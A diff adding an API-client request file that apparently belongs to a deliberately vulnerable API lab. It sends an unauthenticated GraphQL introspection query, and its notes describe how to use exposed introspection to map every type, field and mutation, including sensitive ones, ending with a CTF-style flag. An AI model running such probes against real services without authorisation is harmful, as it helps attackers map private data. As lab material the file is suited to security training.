@@ -1,0 +1,33 @@
+meta {
+  name: G01 Introspection Query
+  type: http
+  seq: 1
+}
+
+post {
+  url: {{baseUrl}}/graphql
+  body: json
+  auth: none
+}
+
+body:json {
+  {
+    "query": "{ __schema { types { name fields { name type { name } } } } }"
+  }
+}
+
+docs {
+  # G01: GraphQL Introspection Exposed
+
+  ## Vulnerability
+  Introspection enabled in production reveals entire schema.
+
+  ## Exploit
+  Query __schema to discover:
+  - All types (User, Product, Order)
+  - All fields (including sensitive ones)
+  - All queries and mutations
+
+  ## Flag
+  VULNAPI{graphql_introspection_*}
+}
